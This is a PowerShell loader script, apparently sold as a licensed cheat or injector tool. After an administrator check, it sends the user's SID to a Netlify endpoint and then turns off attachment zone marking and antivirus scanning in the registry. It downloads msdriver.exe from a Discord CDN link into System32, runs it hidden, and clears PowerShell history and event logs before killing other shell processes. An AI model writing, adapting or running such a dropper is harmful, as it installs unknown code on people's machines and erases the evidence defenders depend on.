# Function to check for admin privileges
function Test-Admin {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Check for admin privileges
if (-not (Test-Admin)) {
    Write-Host "[x] This script requires administrative privileges"
    exit 1
}

# Set TLS protocol
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
    Write-Host "[+] TLS protocol set"
} catch {
    Write-Host "[x] Failed to set TLS protocol: $_"
}

# Set execution policy
try {
    Set-ExecutionPolicy Unrestricted -Scope Process -Force -ErrorAction Stop
    Write-Host "[+] Execution policy set to Unrestricted"
} catch {
    Write-Host "[x] Failed to set execution policy: $_"
    exit 1
}

# Step 1: Get current user's SID
try {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $sid = $user.User.Value
    Write-Host "[+] Retrieved SID: $sid"
} catch {
    Write-Host "[x] Failed to retrieve SID: $_"
    exit 1
}

# Step 2: Call Netlify API
$apiUrl = "https://orphues2apix.netlify.app/.netlify/functions/checkSid?sid=$sid"
$maxRetries = 3
$retryCount = 0
$success = $false

while ($retryCount -lt $maxRetries -and -not $success) {
    try {
        $response = Invoke-RestMethod -Uri $apiUrl -Method Get -TimeoutSec 10
        if ($null -eq $response -or -not (Get-Member -InputObject $response -Name "success" -ErrorAction SilentlyContinue)) {
            throw "Invalid API response structure"
        }
        $success = $true
    } catch {
        $retryCount++
        Write-Host "[x] Network Error (Attempt $retryCount/$maxRetries): $_"
        if ($retryCount -eq $maxRetries) {
            Write-Host "[x] Max retries reached. Exiting."
            exit 1
        }
        Start-Sleep -Seconds 2
    }
}

# Step 3: Check response
if ($response.success -eq $true) {
    Write-Host "[+] License Verified: $($response.message)"
    Write-Host "[*] Proceeding with injection..."

    # Step 4: Restart ctfmon
    Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1

    # Step 5: Modify registry
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name "SaveZoneInformation" -Value 2 -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $regPath -Name "ScanWithAntiVirus" -Value 2 -Type DWord -ErrorAction Stop
        Write-Host "[+] Registry keys updated"
    } catch {
        Write-Host "[x] Failed to modify registry: $_"
    }

    # Step 6: Check processes and download
    $ctfmonRunning = Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue
    $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
    if ($ctfmonRunning -and $discordRunning) {
        Write-Host "[+] Both ctfmon and Discord are running. Downloading msdriver.exe..."
        $destination = "C:\Windows\System32\msdriver.exe"
        $url = "https://cdn.discordapp.com/attachments/1368958099712376952/1385752085806715081/msdriver.exe?ex=685735b3&is=6855e433&hm=dc8d27b2586ac7c80f012099b02b49c5a00ba24aa846a42315140b028e1bff17&"
        try {
            Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop
            if (Test-Path $destination) {
                Write-Host "[+] Downloaded msdriver.exe"
                Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction Stop
                Write-Host "[+] Started msdriver.exe"
            } else {
                Write-Host "[x] Downloaded file not found"
            }
        } catch {
            Write-Host "[x] Failed to download or execute msdriver.exe: $_"
        }
    } else {
        Write-Host "[*] Skipping download as ctfmon or Discord is not running"
    }

    # Step 7: Clean up
    try {
        Clear-History
        $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
        if (Test-Path $historyPath) {
            Remove-Item $historyPath -Force -ErrorAction Stop
            Write-Host "[+] Cleared PowerShell history"
        }
        $attachmentsRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
        if (Test-Path $attachmentsRegKeyPath) {
            Remove-Item -Path $attachmentsRegKeyPath -Recurse -Force -ErrorAction Stop
            Write-Host "[+] Removed registry keys"
        }
        wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object {
            wevtutil cl "$_" -ErrorAction Stop
            Write-Host "[+] Cleared PowerShell event log: $_"
        }
    } catch {
        Write-Host "[x] Failed to clean up: $_"
    }

    # Step 8: Terminate other processes
    try {
        Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | ForEach-Object {
            Stop-Process -Id $_.Id -Force -ErrorAction Stop
            Write-Host "[+] Terminated PowerShell process: $($_.Id)"
        }
        Get-Process -Name "conhost" -ErrorAction Stop | ForEach-Object {
            $parent = Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue
            if ($parent -and $parent.Id -ne $PID) {
                Stop-Process -Id $_.Id -Force -ErrorAction Stop
                Write-Host "[+] Terminated conhost process: $($_.Id)"
            }
        }
    } catch {
        Write-Host "[x] Failed to terminate processes: $_"
    }

} else {
    Write-Host "[x] License Check Failed: $($response.message)"
    Write-Host "[*] You can retry or contact support."
    exit 1
}
